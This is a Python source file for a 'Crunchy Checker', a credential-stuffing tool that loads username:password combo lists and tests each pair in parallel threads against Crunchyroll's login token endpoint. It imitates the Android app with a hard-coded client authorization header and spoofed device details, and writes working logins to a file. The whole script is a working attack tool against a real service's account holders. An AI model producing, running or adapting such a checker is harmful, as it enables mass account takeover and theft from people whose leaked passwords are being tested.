from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from pypresence import Presence
from plyer import notification
import requests
import string
import random
import ctypes
import os

title = "Krul | Crunchy Checker <3"
title_bytes = title.encode('cp1252')
ctypes.windll.kernel32.SetConsoleTitleA(title_bytes)

def SexyCheckerRPC():
    RPC = Presence(client_id="1125212557540601918")
    RPC.connect()
    RPC.update(
        state="Krul | Checking Crunchyroll's Accounts..",
        details="Developed By Hisako | Krul best vampire girl  ",
        large_image="krullarge",
        large_text="Krul Tepes | Can i Suck your Blood? <3 "
    )
    return RPC

def UwUTroia(text, color):
    colors = {
        'blue': '\033[34m',
        'pink': '\033[35m',
        'purple': '\033[35m',
        'red': '\033[31m',       
        'reset': '\033[0m'
    }
    print(f"{colors[color]}{text}{colors['reset']}")

ascii_text = r"""
\033[38;5;105m
 _____         _ 
|  |  |___ _ _| |
|    -|  _| | | |
|__|__|_| |___|_|

Best Queen & Waifu 
Checker made by Hisako
\033[0m
"""

def GenID():
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for _ in range(36))

def CheckAcc(username, password, device_id, valid):
    url = 'https://beta-api.crunchyroll.com/auth/v1/token'

    headers = {
        "Host": "beta-api.crunchyroll.com",
        "authorization": "Basic c2ZjOWYtLXEyYzJ2YWE1eW1zbHo6cThiVk5SYmp2c1g5ZGJwdDV5eTl5TXhjakNRMXgteU0=",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": "Crunchyroll/3.32.3 Android/9 okhttp/4.9.2"
    }
    payload = f"username={username}&password={password}&grant_type=password&scope=offline_access&device_id={device_id}&device_name=DUK-AL20&device_type=samsung%20SM-G935F"

    try:
        with requests.Session() as session:
            response = session.post(url, headers=headers, data=payload)

            if response.status_code == 200:
                UwUTroia(f"Valid Account: {username}:{password}", 'blue')
                valid.append(f"{username}:{password}")
            else:
                UwUTroia(f"Invalid Account: {username}:{password}", 'pink')
    except RequestException as e:
        UwUTroia(f"Network Error during request: {type(e).__name__} - {str(e)}", 'red')

def Check(filename):
    with open(filename, "r") as file:
        accounts = [line.strip().split(":") for line in file]

    device_id = GenID()
    valid = []

    with ThreadPoolExecutor() as executor:
        executor.map(lambda account: CheckAcc(*account, device_id, valid), accounts)

    if valid:
        with open("Valid Acc.txt", "w") as output_file:
            for account in valid:
                output_file.write(account + "\n")

        UwU= len(valid)
        ILikeCoffee = "Crunchyroll Account Check Completed"
        iLoveCoffee = f"{UwU} valid accounts found."
        ShittyIcon = None  

        notification.notify(
            title=ILikeCoffee,
            message=iLoveCoffee,
            app_icon=ShittyIcon,
            timeout=10  
        )

    UwUTroia("Check completed. Valid accounts have been saved in 'Valid Acc.txt'.", 'purple')

def CloseTheSexyRPC():
    rpc.close()

rpc = SexyCheckerRPC()
os.system('cls' if os.name == 'nt' else 'clear')
print(ascii_text.encode('utf-8').decode('unicode-escape'))
filename = input("Enter the path to the text file containing the Crunchyroll accounts to check: ")
Check(filename)
